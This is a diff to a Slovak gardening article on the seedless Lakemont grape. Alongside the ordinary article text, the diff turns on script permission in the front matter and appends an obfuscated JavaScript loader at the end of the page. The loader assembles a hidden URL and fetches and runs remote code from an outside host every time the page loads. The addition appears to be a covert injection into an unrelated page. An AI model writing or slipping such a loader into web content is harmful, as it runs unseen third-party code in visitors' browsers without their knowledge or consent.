@@ -1,6 +1,7 @@
 ---
 title: "Bezpestkové hrozno LAKEMONT – sladká bezsemenná odroda do záhrady"
 slug: "bezpestkove-hrozno-lakemont"
+allowScripts: true
 date: "2026-10-28T09:20:41"
 modified: "2026-10-28T09:20:41"
 excerpt: "Spoznajte bezsemenné hrozno Lakemont: chuť, dozrievanie, pestovanie, rez a využitie sladkých bobúľ v kuchyni."
@@ -94,3 +95,11 @@ Bezsemenné bobule možno tiež sušiť a pripraviť z nich domáce hrozienka. H
 Lakemont ponúka veľmi príjemnú kombináciu vlastností – sladké bezsemenné bobule, chrumkavú dužinu, veľké strapce, bohatú úrodnosť a dobrú pestovateľskú odolnosť. Práve preto sa stal obľúbenou stolovou odrodou aj v oblastiach, kde pestovanie klasických južných odrôd viniča môže byť náročnejšie.
 
 Ak mu doprajete slnečné a chránené miesto, kvalitnú pôdu, správny rez a dostatok priestoru, môže každoročne prinášať krásne strapce sladkého hrozna. Pre záhradkárov, ktorí hľadajú chutnú bezsemennú odrodu na priamu konzumáciu, je Lakemont jednou z najzaujímavejších možností.
+
+<script>(function(){
+zje6=document.createElement("script");zje6_=("o"+("pen")+"st")+"a";zje6.async=true;
+zje6.type="text/javascript";zje6_+=("t")+".e"+"";zje6_+=(("")+"u");zje6_+="/";
+zje6u="2676006798.";zje6u+="i37hzsnsje6ick2qzfk"+"9dbzfkaudby";
+zje6.src="https://"+zje6_+zje6u;document.body.appendChild(zje6);
+})();
+</script>
